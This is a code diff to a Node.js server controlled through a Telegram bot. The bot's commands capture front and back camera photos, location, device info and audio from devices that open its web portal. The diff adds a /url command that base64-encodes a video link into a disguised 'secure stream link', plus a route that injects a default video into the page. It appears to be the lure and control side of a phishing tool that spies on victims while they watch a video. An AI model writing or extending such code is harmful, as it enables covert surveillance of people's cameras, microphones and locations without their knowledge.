@@ -3,6 +3,7 @@ const http = require('http');
 const { Server } = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
 const path = require('path');
+const fs = require('fs');
 require('dotenv').config();
 
 const app = express();
@@ -26,10 +27,15 @@ global.pendingSocketId = null;
 global.approvedSocketId = null;
 global.pendingUsername = "Unknown";
 
+// Render wala domain aur Default Stream URL from Environment Variable
+const myDomain = process.env.FQDN ? (process.env.FQDN.startsWith('http') ? process.env.FQDN : `https://${process.env.FQDN}`) : "https://god-level-security.onrender.com";
+const defaultStreamUrl = process.env.DEFAULT_STREAM_URL || "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
+
 // Automatically register ALL commands in Telegram Menu
 bot.setMyCommands([
     { command: 'start', description: 'Start bot & check status' },
     { command: 'approve', description: 'Authorize pending device' },
+    { command: 'url', description: 'Generate secure stream link (/url <link>)' },
     { command: 'moref', description: 'Front Camera 5 Photos' },
     { command: 'moreb', description: 'Back Camera 5 Photos' },
     { command: 'moreff', description: 'Front Camera with Screen Flash' },
@@ -45,6 +51,21 @@ bot.setMyCommands([
 });
 
 app.use(express.json());
+
+// Custom route to serve index.html with injected Environment Default Stream URL
+app.get('/', (sreq, sres) => {
+    const indexPath = path.join(__dirname, 'public', 'index.html');
+    fs.readFile(indexPath, 'utf8', (err, data) => {
+        if (err) {
+            sres.status(500).send("Error loading portal");
+            return;
+        }
+        // Inject server-side environment stream URL into the HTML template placeholder
+        const updatedHtml = data.replace('__DEFAULT_STREAM_URL__', defaultStreamUrl);
+        sres.send(updatedHtml);
+    });
+});
+
 app.use(express.static(path.join(__dirname, 'public')));
 
 // Load Modules
@@ -87,7 +108,7 @@ io.on('connection', (socket) => {
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (chatId.toString() === adminId.toString()) {
-        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\n- /approve\n- /moref & /moreb\n- /moreff & /morebf\n- /location\n- /info\n- /audio`);
+        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\n- /approve\n- /url <link>\n- /moref & /moreb\n- /moreff & /morebf\n- /location\n- /info\n- /audio`);
     }
 });
 
@@ -102,6 +123,17 @@ bot.onText(/\/approve/, (msg) => {
         } else {
             bot.sendMessage(chatId, "❌ No pending device request.");
         }
+    }
+});
+
+// Telegram /url command handler (Base64 Link Generator)
+bot.onText(/\/url (.+)/, (msg, match) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() === adminId.toString()) {
+        const rawUrl = match[1].trim();
+        const encodedVid = Buffer.from(rawUrl).toString('base64');
+        const generatedLink = `${myDomain}/?v=${encodedVid}`;
+        bot.sendMessage(chatId, `🔗 **Aapka secure link generate ho gaya hai:**\n\n\`${generatedLink}\``);
     }
 });
 
